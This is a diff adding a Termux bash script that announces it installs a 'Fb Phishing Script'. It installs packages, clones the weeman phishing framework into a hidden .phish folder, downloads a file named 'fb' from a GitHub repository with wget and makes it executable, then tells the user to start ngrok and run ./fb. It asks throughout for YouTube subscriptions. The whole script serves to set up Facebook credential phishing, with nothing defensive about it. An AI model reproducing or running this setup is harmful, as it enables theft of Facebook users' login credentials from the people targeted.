@@ -1,0 +1,48 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+clear
+
+echo -e "\033[1m \e[32m You Are Going To Install Fb Phishing Script On Termux"
+
+echo -e "\033[1m \e[32m Please Subscribe Our Youtube Channel"
+
+echo -e "\033[1m \e[32m Starting Installation"
+
+echo " "
+
+echo -e "\033[1m \e[32m Checking For Update And Upgrde"
+
+apt update && apt upgrade
+
+echo -e "\033[1m \e[32m Installing Requierments"
+
+apt install git python python2 figlet curl nano
+
+echo -e "\033[1m \e[32m Installation Completed"
+
+clear
+
+echo -e "\033[1m \e[32m Cloning Into The Main Tool Weeman"
+mkdir .phish
+
+cd $HOME/.phish && git clone https://github.com/evait-security/weeman
+
+echo -e "\033[1m \e[32m Cloning Completed"
+
+echo -e "\033[1m \e[32m Giving Final Touchup"
+
+wget https://raw.githubusercontent.com/Unknown2x/phishing/master/fb
+
+cd $HOME && chmod +x fb
+
+cd $HOME/.phish/weeman && chmod +x *
+
+echo -e "\033[1m \e[32m Installation Proccess Has Completed"
+
+echo -e "\033[1m \e[32m This Tool Will Not Work With Out Ngrok"
+
+echo -e "\033[1m \e[32m Please View Our NGROK Video"
+
+echo -e "\033[1m \e[32m To Run This Tool First Start Ngrok Then Type ./fb"
+
+echo -e "\033[1m \e[32m PLESE SUBSCRIBE OUR CHANNEL"
